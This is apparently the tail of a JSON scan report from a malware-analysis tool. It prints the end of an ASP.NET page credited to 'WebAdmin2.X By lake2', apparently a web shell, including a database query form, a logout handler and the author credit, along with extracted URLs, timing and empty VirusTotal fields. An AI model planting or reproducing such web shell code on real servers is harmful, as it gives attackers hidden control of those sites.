            "    <asp:TextBox ID=\"DB_EString\" Width=\"500\" runat=\"server\" Visible=\"false\" CssClass=\"TextBox\"/>",
            "\t<asp:Button ID=\"DB_eButton\" runat=\"server\" Text=\"Submit\" Visible=\"false\" OnClick=\"DB_oneB\" CssClass=\"buttom\"/>",
            "\t</p>",
            "  <p>",
            "  <asp:DataGrid ID=\"DB_DataGrid\" with=\"100%\" AllowPaging=\"true\" AllowSorting=\"true\" OnSortCommand=\"DB_Sort\" PageSize=\"10\" OnPageIndexChanged=\"DB_Page\" PagerStyle-Mode=\"NumericPages\" runat=\"server\"></asp:DataGrid>",
            "  </p>",
            "</form>",
            "  <%",
            "\tcase \"logout\"",
            "   \t\tsession.Abandon()",
            "\t\tresponse.Write(\"<script>alert(' \u0176');location.href='\" & request.ServerVariables(\"URL\") & \"';</sc\" & \"ript>\")",
            "\tend select",
            "end if",
            "Catch error_x",
            "\tresponse.Write(\"<font color=\"\"red\"\"></font>\"&error_x.Message)",
            "End Try",
            "</p>",
            "</p>",
            "<hr noshade>",
            "<script language=\"javascript\">",
            "function closewindow()",
            "{self.close();}",
            "</script>",
            "<p align=\"center\">WebAdmin2.X By <a href=\"http://lake2.0x54.org\" title=\"Welcome to my page:)\" target=\"_blank\"><em>lake2</em></a> from China [<a href=\"http://blog.csdn.net/lake2/archive/2005/01/27/270921.aspx\" target=\"_blank\"></a>]</p>",
            "</body>",
            "</html>"
        ],
        "file": {},
        "fuzzing": {},
        "ip": [
            "127.0.0.1"
        ],
        "url": [
            "http://www.w3.org/TR/html4/loose.dtd",
            "http://blog.csdn.net/lake2/archive/2005/01/27/270921.aspx",
            "http://lake2.0x54.com",
            "http://lake2.0x54.org"
        ]
    },
    "time": "0:00:00.485338",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
